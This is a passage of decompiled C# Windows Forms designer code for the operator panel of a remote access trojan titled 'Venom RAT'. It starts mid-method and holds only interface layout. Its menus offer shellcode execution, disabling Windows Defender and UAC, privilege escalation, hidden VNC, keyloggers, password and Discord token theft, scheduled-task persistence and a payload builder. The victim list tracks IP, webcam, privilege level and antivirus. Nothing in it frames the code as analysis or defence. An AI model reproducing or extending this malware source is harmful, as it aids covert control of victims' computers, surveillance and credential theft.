      this.SendFileToMemoryToolStripMenuItem.ForeColor = Color.Black;
      this.SendFileToMemoryToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SendFileToMemoryToolStripMenuItem.Image");
      this.SendFileToMemoryToolStripMenuItem.ImageTransparentColor = Color.Red;
      this.SendFileToMemoryToolStripMenuItem.Name = "SendFileToMemoryToolStripMenuItem";
      this.SendFileToMemoryToolStripMenuItem.Size = new Size(236, 24);
      this.SendFileToMemoryToolStripMenuItem.Text = "Transfer File To Memory";
      this.SendFileToMemoryToolStripMenuItem.Click += new EventHandler(this.SendFileToMemoryToolStripMenuItem_Click);
      this.toolStripSeparator26.Name = "toolStripSeparator26";
      this.toolStripSeparator26.Size = new Size(233, 6);
      this.SendFileToDiskToolStripMenuItem.BackColor = Color.Transparent;
      this.SendFileToDiskToolStripMenuItem.ForeColor = Color.Black;
      this.SendFileToDiskToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SendFileToDiskToolStripMenuItem.Image");
      this.SendFileToDiskToolStripMenuItem.ImageTransparentColor = Color.Red;
      this.SendFileToDiskToolStripMenuItem.Name = "SendFileToDiskToolStripMenuItem";
      this.SendFileToDiskToolStripMenuItem.Size = new Size(236, 24);
      this.SendFileToDiskToolStripMenuItem.Text = "Transfer File To Disk";
      this.SendFileToDiskToolStripMenuItem.Click += new EventHandler(this.SendFileToDiskToolStripMenuItem_Click);
      this.toolStripSeparator27.Name = "toolStripSeparator27";
      this.toolStripSeparator27.Size = new Size(233, 6);
      this.fromUrlToolStripMenuItem.BackColor = Color.Transparent;
      this.fromUrlToolStripMenuItem.ForeColor = Color.Black;
      this.fromUrlToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("fromUrlToolStripMenuItem.Image");
      this.fromUrlToolStripMenuItem.ImageTransparentColor = Color.Red;
      this.fromUrlToolStripMenuItem.Name = "fromUrlToolStripMenuItem";
      this.fromUrlToolStripMenuItem.Size = new Size(236, 24);
      this.fromUrlToolStripMenuItem.Text = "From Url";
      this.fromUrlToolStripMenuItem.Click += new EventHandler(this.fromUrlToolStripMenuItem_Click);
      this.toolStripSeparator28.Name = "toolStripSeparator28";
      this.toolStripSeparator28.Size = new Size(197, 6);
      this.VisteWebsiteToolStripMenuItem1.BackColor = Color.FromArgb(12, 89, 71);
      this.VisteWebsiteToolStripMenuItem1.ForeColor = Color.Black;
      this.VisteWebsiteToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("VisteWebsiteToolStripMenuItem1.Image");
      this.VisteWebsiteToolStripMenuItem1.Name = "VisteWebsiteToolStripMenuItem1";
      this.VisteWebsiteToolStripMenuItem1.Size = new Size(211, 34);
      this.VisteWebsiteToolStripMenuItem1.Text = "Visit Website";
      this.VisteWebsiteToolStripMenuItem1.Click += new EventHandler(this.VisteWebsiteToolStripMenuItem1_Click);
      this.toolStripSeparator29.Name = "toolStripSeparator29";
      this.toolStripSeparator29.Size = new Size(197, 6);
      this.runShellcodeToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.runShellcodeToolStripMenuItem.ForeColor = Color.Black;
      this.runShellcodeToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("runShellcodeToolStripMenuItem.Image");
      this.runShellcodeToolStripMenuItem.Name = "runShellcodeToolStripMenuItem";
      this.runShellcodeToolStripMenuItem.Size = new Size(200, 24);
      this.runShellcodeToolStripMenuItem.Text = "Execute Shellcode";
      this.runShellcodeToolStripMenuItem.Click += new EventHandler(this.runShellcodeToolStripMenuItem_Click);
      this.toolStripSeparator30.Name = "toolStripSeparator30";
      this.toolStripSeparator30.Size = new Size(197, 6);
      this.ChangeWallpaperToolStripMenuItem1.BackColor = Color.FromArgb(12, 89, 71);
      this.ChangeWallpaperToolStripMenuItem1.ForeColor = Color.Black;
      this.ChangeWallpaperToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("ChangeWallpaperToolStripMenuItem1.Image");
      this.ChangeWallpaperToolStripMenuItem1.Name = "ChangeWallpaperToolStripMenuItem1";
      this.ChangeWallpaperToolStripMenuItem1.Size = new Size(200, 24);
      this.ChangeWallpaperToolStripMenuItem1.Text = "Change Wallpaper";
      this.ChangeWallpaperToolStripMenuItem1.Click += new EventHandler(this.ChangeWallpaperToolStripMenuItem1_Click);
      this.toolStripSeparator31.Name = "toolStripSeparator31";
      this.toolStripSeparator31.Size = new Size(197, 6);
      this.FileSearchToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.FileSearchToolStripMenuItem.ForeColor = Color.Black;
      this.FileSearchToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("FileSearchToolStripMenuItem.Image");
      this.FileSearchToolStripMenuItem.Name = "FileSearchToolStripMenuItem";
      this.FileSearchToolStripMenuItem.Size = new Size(200, 24);
      this.FileSearchToolStripMenuItem.Text = "File Search";
      this.FileSearchToolStripMenuItem.Click += new EventHandler(this.FileSearchToolStripMenuItem_Click);
      this.MalwareToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.DisableWDToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator32,
        (ToolStripItem) this.DisableUACToolStripMenuItem
      });
      this.MalwareToolStripMenuItem.ForeColor = Color.Black;
      this.MalwareToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("MalwareToolStripMenuItem.Image");
      this.MalwareToolStripMenuItem.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.MalwareToolStripMenuItem.Name = "MalwareToolStripMenuItem";
      this.MalwareToolStripMenuItem.Size = new Size(230, 34);
      this.MalwareToolStripMenuItem.Text = "WD Bypassing";
      this.DisableWDToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.DisableWDToolStripMenuItem.ForeColor = Color.Black;
      this.DisableWDToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DisableWDToolStripMenuItem.Image");
      this.DisableWDToolStripMenuItem.Name = "DisableWDToolStripMenuItem";
      this.DisableWDToolStripMenuItem.Size = new Size(172, 34);
      this.DisableWDToolStripMenuItem.Text = "Disable WD";
      this.DisableWDToolStripMenuItem.Click += new EventHandler(this.DisableWDToolStripMenuItem_Click);
      this.toolStripSeparator32.Name = "toolStripSeparator32";
      this.toolStripSeparator32.Size = new Size(169, 6);
      this.DisableUACToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.DisableUACToolStripMenuItem.ForeColor = Color.Black;
      this.DisableUACToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DisableUACToolStripMenuItem.Image");
      this.DisableUACToolStripMenuItem.Name = "DisableUACToolStripMenuItem";
      this.DisableUACToolStripMenuItem.Size = new Size(172, 34);
      this.DisableUACToolStripMenuItem.Text = "Disable UAC";
      this.DisableUACToolStripMenuItem.Click += new EventHandler(this.DisableUACToolStripMenuItem_Click);
      this.BypassUACAToolStripMenuItem.BackColor = Color.FromArgb(30, 30, 30);
      this.BypassUACAToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.SilentCleanupToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator33,
        (ToolStripItem) this.RunasToolStripMenuItem
      });
      this.BypassUACAToolStripMenuItem.ForeColor = Color.Black;
      this.BypassUACAToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("BypassUACAToolStripMenuItem.Image");
      this.BypassUACAToolStripMenuItem.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.BypassUACAToolStripMenuItem.Name = "BypassUACAToolStripMenuItem";
      this.BypassUACAToolStripMenuItem.ShowShortcutKeys = false;
      this.BypassUACAToolStripMenuItem.Size = new Size(230, 34);
      this.BypassUACAToolStripMenuItem.Text = "UAC Privileges";
      this.SilentCleanupToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.SilentCleanupToolStripMenuItem.ForeColor = Color.Black;
      this.SilentCleanupToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SilentCleanupToolStripMenuItem.Image");
      this.SilentCleanupToolStripMenuItem.Name = "SilentCleanupToolStripMenuItem";
      this.SilentCleanupToolStripMenuItem.Size = new Size(315, 34);
      this.SilentCleanupToolStripMenuItem.Text = "Privileges Windows 8.1/10/Servers";
      this.SilentCleanupToolStripMenuItem.Click += new EventHandler(this.SilentCleanupToolStripMenuItem_Click);
      this.toolStripSeparator33.Name = "toolStripSeparator33";
      this.toolStripSeparator33.Size = new Size(312, 6);
      this.RunasToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.RunasToolStripMenuItem.ForeColor = Color.Black;
      this.RunasToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("RunasToolStripMenuItem.Image");
      this.RunasToolStripMenuItem.Name = "RunasToolStripMenuItem";
      this.RunasToolStripMenuItem.Size = new Size(315, 34);
      this.RunasToolStripMenuItem.Text = "Privileges Windows 7";
      this.RunasToolStripMenuItem.Click += new EventHandler(this.RunasToolStripMenuItem_Click);
      this.hVNCToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.coomingSoonToolStripMenuItem,
        (ToolStripItem) this.moveToHVNCToolStripMenuItem
      });
      this.hVNCToolStripMenuItem.ForeColor = Color.Black;
      this.hVNCToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("hVNCToolStripMenuItem.Image");
      this.hVNCToolStripMenuItem.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.hVNCToolStripMenuItem.Name = "hVNCToolStripMenuItem";
      this.hVNCToolStripMenuItem.Size = new Size(230, 34);
      this.hVNCToolStripMenuItem.Text = "hVNC";
      this.coomingSoonToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("coomingSoonToolStripMenuItem.Image");
      this.coomingSoonToolStripMenuItem.Name = "coomingSoonToolStripMenuItem";
      this.coomingSoonToolStripMenuItem.Size = new Size(232, 34);
      this.coomingSoonToolStripMenuItem.Text = "Venom HVNC";
      this.coomingSoonToolStripMenuItem.Click += new EventHandler(this.coomingSoonToolStripMenuItem_Click);
      this.moveToHVNCToolStripMenuItem.ForeColor = SystemColors.ControlText;
      this.moveToHVNCToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("moveToHVNCToolStripMenuItem.Image");
      this.moveToHVNCToolStripMenuItem.Name = "moveToHVNCToolStripMenuItem";
      this.moveToHVNCToolStripMenuItem.Size = new Size(232, 34);
      this.moveToHVNCToolStripMenuItem.Text = "Move Client To HVNC";
      this.moveToHVNCToolStripMenuItem.Click += new EventHandler(this.moveToHVNCToolStripMenuItem_Click);
      this.InstallToolStripMenuItem.BackColor = Color.FromArgb(30, 30, 30);
      this.InstallToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[3]
      {
        (ToolStripItem) this.SchtaskInstallToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator34,
        (ToolStripItem) this.SchtaskUninstallToolStripMenuItem
      });
      this.InstallToolStripMenuItem.ForeColor = Color.Black;
      this.InstallToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("InstallToolStripMenuItem.Image");
      this.InstallToolStripMenuItem.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.InstallToolStripMenuItem.Name = "InstallToolStripMenuItem";
      this.InstallToolStripMenuItem.Size = new Size(230, 34);
      this.InstallToolStripMenuItem.Text = "Active Task Scheduler";
      this.SchtaskInstallToolStripMenuItem.BackColor = Color.FromArgb(12, 89, 71);
      this.SchtaskInstallToolStripMenuItem.ForeColor = Color.Black;
      this.SchtaskInstallToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SchtaskInstallToolStripMenuItem.Image");
      this.SchtaskInstallToolStripMenuItem.Name = "SchtaskInstallToolStripMenuItem";
      this.SchtaskInstallToolStripMenuItem.Size = new Size(246, 34);
      this.SchtaskInstallToolStripMenuItem.Text = "Task Scheduler Install";
      this.SchtaskInstallToolStripMenuItem.Click += new EventHandler(this.SchtaskInstallToolStripMenuItem_Click);
      this.toolStripSeparator34.Name = "toolStripSeparator34";
      this.toolStripSeparator34.Size = new Size(243, 6);
      this.SchtaskUninstallToolStripMenuItem.BackColor = Color.Transparent;
      this.SchtaskUninstallToolStripMenuItem.ForeColor = Color.Black;
      this.SchtaskUninstallToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("SchtaskUninstallToolStripMenuItem.Image");
      this.SchtaskUninstallToolStripMenuItem.Name = "SchtaskUninstallToolStripMenuItem";
      this.SchtaskUninstallToolStripMenuItem.Size = new Size(246, 34);
      this.SchtaskUninstallToolStripMenuItem.Text = "Task Scheduler Uninstall";
      this.SchtaskUninstallToolStripMenuItem.Click += new EventHandler(this.SchtaskUninstallToolStripMenuItem_Click);
      this.InformationToolStripMenuItem.ForeColor = Color.Black;
      this.InformationToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("InformationToolStripMenuItem.Image");
      this.InformationToolStripMenuItem.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.InformationToolStripMenuItem.Name = "InformationToolStripMenuItem";
      this.InformationToolStripMenuItem.Size = new Size(230, 34);
      this.InformationToolStripMenuItem.Text = "Information";
      this.InformationToolStripMenuItem.Click += new EventHandler(this.InformationToolStripMenuItem_Click);
      this.toolStripMenuItem2.BackColor = Color.FromArgb(30, 30, 30);
      this.toolStripMenuItem2.DropDownItems.AddRange(new ToolStripItem[5]
      {
        (ToolStripItem) this.passwordRecoveryToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator35,
        (ToolStripItem) this.toolStripMenuItem3,
        (ToolStripItem) this.toolStripSeparator36,
        (ToolStripItem) this.toolStripMenuItem4
      });
      this.toolStripMenuItem2.ForeColor = Color.Black;
      this.toolStripMenuItem2.Image = (Image) componentResourceManager.GetObject("toolStripMenuItem2.Image");
      this.toolStripMenuItem2.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.toolStripMenuItem2.Name = "toolStripMenuItem2";
      this.toolStripMenuItem2.Size = new Size(230, 34);
      this.toolStripMenuItem2.Text = "KeyLogger";
      this.passwordRecoveryToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("passwordRecoveryToolStripMenuItem.Image");
      this.passwordRecoveryToolStripMenuItem.Name = "passwordRecoveryToolStripMenuItem";
      this.passwordRecoveryToolStripMenuItem.Size = new Size(214, 34);
      this.passwordRecoveryToolStripMenuItem.Text = "Password Recovery";
      this.passwordRecoveryToolStripMenuItem.Click += new EventHandler(this.passwordRecoveryToolStripMenuItem_Click_1);
      this.toolStripSeparator35.Name = "toolStripSeparator35";
      this.toolStripSeparator35.Size = new Size(211, 6);
      this.toolStripMenuItem3.BackColor = Color.FromArgb(12, 89, 71);
      this.toolStripMenuItem3.ForeColor = Color.Black;
      this.toolStripMenuItem3.Image = (Image) componentResourceManager.GetObject("toolStripMenuItem3.Image");
      this.toolStripMenuItem3.Name = "toolStripMenuItem3";
      this.toolStripMenuItem3.Size = new Size(214, 34);
      this.toolStripMenuItem3.Text = "Online KeyLogger";
      this.toolStripMenuItem3.Click += new EventHandler(this.toolStripMenuItem3_Click);
      this.toolStripSeparator36.Name = "toolStripSeparator36";
      this.toolStripSeparator36.Size = new Size(211, 6);
      this.toolStripMenuItem4.BackColor = Color.FromArgb(12, 89, 71);
      this.toolStripMenuItem4.ForeColor = Color.Black;
      this.toolStripMenuItem4.Image = (Image) componentResourceManager.GetObject("toolStripMenuItem4.Image");
      this.toolStripMenuItem4.Name = "toolStripMenuItem4";
      this.toolStripMenuItem4.Size = new Size(214, 34);
      this.toolStripMenuItem4.Text = "Offline KeyLogger";
      this.toolStripMenuItem4.Click += new EventHandler(this.toolStripMenuItem4_Click);
      this.toolStripMenuItem5.BackColor = Color.FromArgb(30, 30, 30);
      this.toolStripMenuItem5.ForeColor = Color.Black;
      this.toolStripMenuItem5.Image = (Image) componentResourceManager.GetObject("toolStripMenuItem5.Image");
      this.toolStripMenuItem5.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.toolStripMenuItem5.Name = "toolStripMenuItem5";
      this.toolStripMenuItem5.Size = new Size(230, 34);
      this.toolStripMenuItem5.Text = "Client Folder";
      this.toolStripMenuItem5.Click += new EventHandler(this.toolStripMenuItem5_Click);
      this.contextMenuClient.BackColor = Color.FromArgb(240, 240, 240);
      this.contextMenuClient.Font = new Font("Segoe UI", 11.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.contextMenuClient.ImageScalingSize = new Size(27, 27);
      this.contextMenuClient.Items.AddRange(new ToolStripItem[25]
      {
        (ToolStripItem) this.builderToolStripMenuItem1,
        (ToolStripItem) this.toolStripSeparator1,
        (ToolStripItem) this.SystemControlToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator2,
        (ToolStripItem) this.RemoteManagerToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator3,
        (ToolStripItem) this.RemoteControlToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator5,
        (ToolStripItem) this.MalwareToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator6,
        (ToolStripItem) this.BypassUACAToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator7,
        (ToolStripItem) this.InstallToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator8,
        (ToolStripItem) this.toolStripMenuItem2,
        (ToolStripItem) this.toolStripSeparator9,
        (ToolStripItem) this.discordToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator37,
        (ToolStripItem) this.hVNCToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator10,
        (ToolStripItem) this.justForFunToolStripMenuItem,
        (ToolStripItem) this.toolStripSeparator11,
        (ToolStripItem) this.toolStripMenuItem5,
        (ToolStripItem) this.toolStripSeparator12,
        (ToolStripItem) this.InformationToolStripMenuItem
      });
      this.contextMenuClient.Name = "contextMenuStrip1";
      this.contextMenuClient.RenderMode = ToolStripRenderMode.System;
      this.contextMenuClient.Size = new Size(231, 518);
      this.builderToolStripMenuItem1.ForeColor = Color.Black;
      this.builderToolStripMenuItem1.Image = (Image) componentResourceManager.GetObject("builderToolStripMenuItem1.Image");
      this.builderToolStripMenuItem1.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.builderToolStripMenuItem1.Name = "builderToolStripMenuItem1";
      this.builderToolStripMenuItem1.Size = new Size(230, 34);
      this.builderToolStripMenuItem1.Text = "Building Server";
      this.builderToolStripMenuItem1.Click += new EventHandler(this.builderToolStripMenuItem1_Click_1);
      this.toolStripSeparator1.Name = "toolStripSeparator1";
      this.toolStripSeparator1.Size = new Size(227, 6);
      this.toolStripSeparator2.Name = "toolStripSeparator2";
      this.toolStripSeparator2.Size = new Size(227, 6);
      this.toolStripSeparator3.Name = "toolStripSeparator3";
      this.toolStripSeparator3.Size = new Size(227, 6);
      this.toolStripSeparator5.Name = "toolStripSeparator5";
      this.toolStripSeparator5.Size = new Size(227, 6);
      this.toolStripSeparator6.Name = "toolStripSeparator6";
      this.toolStripSeparator6.Size = new Size(227, 6);
      this.toolStripSeparator7.Name = "toolStripSeparator7";
      this.toolStripSeparator7.Size = new Size(227, 6);
      this.toolStripSeparator8.Name = "toolStripSeparator8";
      this.toolStripSeparator8.Size = new Size(227, 6);
      this.toolStripSeparator9.Name = "toolStripSeparator9";
      this.toolStripSeparator9.Size = new Size(227, 6);
      this.discordToolStripMenuItem.DropDownItems.AddRange(new ToolStripItem[1]
      {
        (ToolStripItem) this.DiscordRecoveryToolStripMenuItem
      });
      this.discordToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("discordToolStripMenuItem.Image");
      this.discordToolStripMenuItem.Name = "discordToolStripMenuItem";
      this.discordToolStripMenuItem.Size = new Size(230, 34);
      this.discordToolStripMenuItem.Text = "Discord";
      this.DiscordRecoveryToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("DiscordRecoveryToolStripMenuItem.Image");
      this.DiscordRecoveryToolStripMenuItem.Name = "DiscordRecoveryToolStripMenuItem";
      this.DiscordRecoveryToolStripMenuItem.Size = new Size(247, 34);
      this.DiscordRecoveryToolStripMenuItem.Text = "Token Discord Recovery";
      this.DiscordRecoveryToolStripMenuItem.Click += new EventHandler(this.DiscordRecoveryToolStripMenuItem_Click);
      this.toolStripSeparator37.Name = "toolStripSeparator37";
      this.toolStripSeparator37.Size = new Size(227, 6);
      this.toolStripSeparator10.Name = "toolStripSeparator10";
      this.toolStripSeparator10.Size = new Size(227, 6);
      this.justForFunToolStripMenuItem.ForeColor = Color.Black;
      this.justForFunToolStripMenuItem.Image = (Image) componentResourceManager.GetObject("justForFunToolStripMenuItem.Image");
      this.justForFunToolStripMenuItem.ImageTransparentColor = Color.FromArgb(8, 104, 81);
      this.justForFunToolStripMenuItem.Name = "justForFunToolStripMenuItem";
      this.justForFunToolStripMenuItem.Size = new Size(230, 34);
      this.justForFunToolStripMenuItem.Text = "Just For Fun";
      this.justForFunToolStripMenuItem.Click += new EventHandler(this.justForFunToolStripMenuItem_Click);
      this.toolStripSeparator11.Name = "toolStripSeparator11";
      this.toolStripSeparator11.Size = new Size(227, 6);
      this.toolStripSeparator12.Name = "toolStripSeparator12";
      this.toolStripSeparator12.Size = new Size(227, 6);
      this.panel2.BackColor = Color.FromArgb(39, 39, 39);
      this.panel2.Controls.Add((Control) this.guna2Panel1);
      this.panel2.Controls.Add((Control) this.guna2ResizeBox1);
      this.panel2.Controls.Add((Control) this.statusStrip1);
      this.panel2.Controls.Add((Control) this.listView1);
      this.panel2.Dock = DockStyle.Fill;
      this.panel2.Location = new Point(0, 0);
      this.panel2.Name = "panel2";
      this.panel2.Size = new Size(1560, 787);
      this.panel2.TabIndex = 6;
      ((Control) this.guna2ResizeBox1).Anchor = AnchorStyles.Bottom | AnchorStyles.Right;
      ((Control) this.guna2ResizeBox1).BackColor = Color.FromArgb(8, 104, 81);
      this.guna2ResizeBox1.FillColor = Color.White;
      ((Control) this.guna2ResizeBox1).ForeColor = Color.Black;
      ((Control) this.guna2ResizeBox1).Location = new Point(1539, 766);
      ((Control) this.guna2ResizeBox1).Name = "guna2ResizeBox1";
      ((Control) this.guna2ResizeBox1).Size = new Size(20, 20);
      ((Control) this.guna2ResizeBox1).TabIndex = 130;
      this.guna2ResizeBox1.TargetControl = (Control) this;
      this.statusStrip1.BackColor = Color.FromArgb(8, 104, 81);
      this.statusStrip1.ImageScalingSize = new Size(24, 24);
      this.statusStrip1.Items.AddRange(new ToolStripItem[2]
      {
        (ToolStripItem) this.toolStripStatusLabel1,
        (ToolStripItem) this.toolStripStatusLabel2
      });
      this.statusStrip1.Location = new Point(0, 765);
      this.statusStrip1.Name = "statusStrip1";
      this.statusStrip1.Padding = new Padding(1, 0, 9, 0);
      this.statusStrip1.Size = new Size(1560, 22);
      this.statusStrip1.TabIndex = 8;
      this.statusStrip1.Text = "statusStrip1";
      this.toolStripStatusLabel1.ForeColor = Color.Gainsboro;
      this.toolStripStatusLabel1.LinkColor = Color.Green;
      this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
      this.toolStripStatusLabel1.Size = new Size(16, 17);
      this.toolStripStatusLabel1.Text = "...";
      this.toolStripStatusLabel1.VisitedLinkColor = Color.Green;
      this.toolStripStatusLabel2.ForeColor = Color.Gainsboro;
      this.toolStripStatusLabel2.LinkColor = Color.Gainsboro;
      this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
      this.toolStripStatusLabel2.Size = new Size(130, 17);
      this.toolStripStatusLabel2.Text = "                    Notification";
      this.listView1.Anchor = AnchorStyles.Top | AnchorStyles.Bottom | AnchorStyles.Left | AnchorStyles.Right;
      this.listView1.BackColor = Color.FromArgb(24, 24, 24);
      this.listView1.BorderStyle = BorderStyle.None;
      this.listView1.Columns.AddRange(new ColumnHeader[14]
      {
        this.lv_ip,
        this.lv_country,
        this.lv_group,
        this.lv_hwid,
        this.lv_user,
        this.lv_camera,
        this.lv_os,
        this.lv_version,
        this.lv_ins,
        this.lv_admin,
        this.lv_av,
        this.lv_ping,
        this.lv_act,
        this.columnHeader1
      });
      this.listView1.ContextMenuStrip = this.contextMenuClient;
      this.listView1.Font = new Font("Arial", 8.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.listView1.ForeColor = Color.Gainsboro;
      this.listView1.FullRowSelect = true;
      this.listView1.HeaderStyle = ColumnHeaderStyle.Nonclickable;
      this.listView1.HideSelection = false;
      this.listView1.Location = new Point(0, 60);
      this.listView1.Margin = new Padding(2);
      this.listView1.Name = "listView1";
      this.listView1.ShowGroups = false;
      this.listView1.ShowItemToolTips = true;
      this.listView1.Size = new Size(1560, 727);
      this.listView1.TabIndex = 7;
      this.listView1.UseCompatibleStateImageBehavior = false;
      this.listView1.View = View.Details;
      this.lv_ip.Tag = (object) "";
      this.lv_ip.Text = "IP Addresse";
      this.lv_ip.Width = 106;
      this.lv_country.Text = "Location";
      this.lv_country.Width = 101;
      this.lv_group.Text = "Group Team";
      this.lv_group.Width = 92;
      this.lv_hwid.Text = "Hardware ID";
      this.lv_hwid.Width = 117;
      this.lv_user.Text = "PC - UserName";
      this.lv_user.Width = 117;
      this.lv_camera.Text = "Web Camera";
      this.lv_camera.Width = 99;
      this.lv_os.Text = "Operating System";
      this.lv_os.Width = 179;
      this.lv_version.Text = "Client Version";
      this.lv_version.Width = 126;
      this.lv_ins.Text = "Active time";
      this.lv_ins.Width = 120;
      this.lv_admin.Text = "Privilege Level";
      this.lv_admin.Width = 166;
      this.lv_av.Text = "OS AntiVirus";
      this.lv_av.Width = 136;
      this.lv_ping.Text = "Ping";
      this.lv_act.Text = "Explorer Activity ";
      this.lv_act.Width = 350;
      this.columnHeader1.Text = "";
      this.columnHeader1.Width = 900;
      this.guna2BorderlessForm1.AnimateWindow = true;
      this.guna2BorderlessForm1.AnimationType = (Guna2BorderlessForm.AnimateWindowType) 8;
      this.guna2BorderlessForm1.BorderRadius = 10;
      this.guna2BorderlessForm1.ContainerControl = (ContainerControl) this;
      this.guna2BorderlessForm1.DockIndicatorColor = Color.FromArgb(0, 177, 130);
      this.guna2BorderlessForm1.ShadowColor = Color.FromArgb(0, 177, 130);
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = Color.FromArgb(24, 24, 24);
      this.ClientSize = new Size(1560, 787);
      this.Controls.Add((Control) this.panel2);
      this.Controls.Add((Control) this.menuStrip1);
      this.Controls.Add((Control) this.tabControl122);
      this.FormBorderStyle = FormBorderStyle.None;
      this.Icon = (Icon) componentResourceManager.GetObject("$this.Icon");
      this.MainMenuStrip = this.menuStrip1;
      this.Margin = new Padding(2);
      this.MaximizeBox = false;
      this.Name = nameof (Form1);
      this.StartPosition = FormStartPosition.CenterScreen;
      this.Text = "Venom RAT";
      this.Activated += new EventHandler(this.Form1_Activated);
      this.Deactivate += new EventHandler(this.Form1_Deactivate);
      this.FormClosed += new FormClosedEventHandler(this.Form1_FormClosed);
      this.Load += new EventHandler(this.Form1_Load);
      this.tabControl122.ResumeLayout(false);
      this.tabPage33.ResumeLayout(false);
      this.contextMenuThumbnail.ResumeLayout(false);
      this.tabPage44.ResumeLayout(false);
      this.contextMenuTasks.ResumeLayout(false);
      ((Control) this.guna2Panel1).ResumeLayout(false);
      ((Control) this.guna2Panel1).PerformLayout();
      ((ISupportInitialize) this.pictureBox1).EndInit();
      this.menuStrip1.ResumeLayout(false);
      this.menuStrip1.PerformLayout();
      this.performanceCounter2.EndInit();
      this.performanceCounter1.EndInit();
      this.contextMenuLogs.ResumeLayout(false);
      this.contextMenuClient.ResumeLayout(false);
      this.panel2.ResumeLayout(false);
      this.panel2.PerformLayout();
      this.statusStrip1.ResumeLayout(false);
      this.statusStrip1.PerformLayout();
      this.ResumeLayout(false);
      this.PerformLayout();
    }
  }
}
